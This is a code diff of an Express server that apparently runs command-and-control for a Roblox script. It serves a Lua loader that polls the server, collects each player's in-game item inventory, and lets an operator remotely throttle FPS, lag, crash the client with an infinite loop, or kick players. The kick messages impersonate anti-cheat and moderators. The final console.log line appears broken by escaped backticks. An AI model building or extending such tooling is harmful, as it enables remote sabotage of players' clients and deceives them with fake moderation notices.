@@ -413,9 +413,10 @@ local function poll()
     if data.crash == true then
         while true do end
     end
+
     if data.kick == true and not kicked then
         kicked = true
-        LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
+        LP:Kick("You have been kicked by the moderators.")
     end
 end
 
@@ -429,33 +430,44 @@ end)
 task.spawn(function()
     while task.wait(0.5) do poll() end
 end)`;
+
     res.setHeader('Content-Type', 'text/plain');
     res.send(loader);
 });
 
 app.post('/api/public/heartbeat', (req, res) => {
     const data = req.body;
+
     if (!data || !data.user_id) {
         return res.status(400).json({ error: 'Missing user_id' });
     }
+
     const userId = String(data.user_id);
     const existing = players.get(userId) || {};
-    
+
     let brainrots = data.brainrots || [];
+
     if (!Array.isArray(brainrots) || brainrots.length === 0) {
         if (existing.brainrots && Array.isArray(existing.brainrots) && existing.brainrots.length > 0) {
             brainrots = existing.brainrots;
         }
     } else {
-        brainrots = brainrots.filter(b => 
-            b && typeof b === 'object' && 
+        brainrots = brainrots.filter(b =>
+            b &&
+            typeof b === 'object' &&
             ((b.title && b.title !== '') || (b.cash && b.cash !== ''))
         );
-        if (brainrots.length === 0 && existing.brainrots && Array.isArray(existing.brainrots) && existing.brainrots.length > 0) {
+
+        if (
+            brainrots.length === 0 &&
+            existing.brainrots &&
+            Array.isArray(existing.brainrots) &&
+            existing.brainrots.length > 0
+        ) {
             brainrots = existing.brainrots;
         }
     }
-    
+
     players.set(userId, {
         ...existing,
         ...data,
@@ -467,6 +479,7 @@ app.post('/api/public/heartbeat', (req, res) => {
         lag_n: existing.lag_n || false,
         lag_c: existing.lag_c || false,
     });
+
     res.json({ status: 'ok' });
 });
 
@@ -497,14 +510,27 @@ app.get('/api/players', (req, res) => {
         list.push({ ...p });
         players.set(id, p);
     }
+
     res.json({ players: list });
 });
 
 app.get('/api/command_state', (req, res) => {
     const userId = req.query.user_id;
-    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
+
+    if (!userId) {
+        return res.status(400).json({ error: 'Missing user_id' });
+    }
+
     const p = players.get(String(userId));
-    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false });
+
+    if (!p) {
+        return res.json({
+            fps_limit: false,
+            lag_n: false,
+            lag_c: false
+        });
+    }
+
     res.json({
         fps_limit: p.fps_limit || false,
         lag_n: p.lag_n || false,
@@ -513,39 +539,73 @@ app.get('/api/command_state', (req, res) => {
 });
 
 app.post('/api/command', (req, res) => {
-    const { user_id, fps_limit, lag_n, lag_c, kick, crash } = req.body;
-    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
+    const {
+        user_id,
+        fps_limit,
+        lag_n,
+        lag_c,
+        kick,
+        crash
+    } = req.body;
+
+    if (!user_id) {
+        return res.status(400).json({ error: 'Missing user_id' });
+    }
+
     const userId = String(user_id);
     const p = players.get(userId);
-    if (!p) return res.status(404).json({ error: 'Player not found' });
+
+    if (!p) {
+        return res.status(404).json({ error: 'Player not found' });
+    }
+
     if (fps_limit !== undefined) p.fps_limit = !!fps_limit;
     if (lag_n !== undefined) p.lag_n = !!lag_n;
     if (lag_c !== undefined) p.lag_c = !!lag_c;
+
     if (kick === true) p._kick = true;
     if (crash === true) p._crash = true;
+
     players.set(userId, p);
+
     res.json({ status: 'ok' });
 });
 
 app.get('/api/public/command', (req, res) => {
     const userId = req.query.user_id;
-    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
+
+    if (!userId) {
+        return res.status(400).json({ error: 'Missing user_id' });
+    }
+
     const p = players.get(String(userId));
-    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false });
+
+    if (!p) {
+        return res.json({
+            fps_limit: false,
+            lag_n: false,
+            lag_c: false
+        });
+    }
+
     const response = {
         fps_limit: p.fps_limit || false,
         lag_n: p.lag_n || false,
         lag_c: p.lag_c || false,
     };
+
     if (p._kick) {
         response.kick = true;
         p._kick = false;
     }
+
     if (p._crash) {
         response.crash = true;
         p._crash = false;
     }
+
     players.set(String(userId), p);
+
     res.json(response);
 });
 
@@ -554,5 +614,5 @@ app.get('/', (req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+    console.log(\`Server running on port \${PORT}\`);
 });
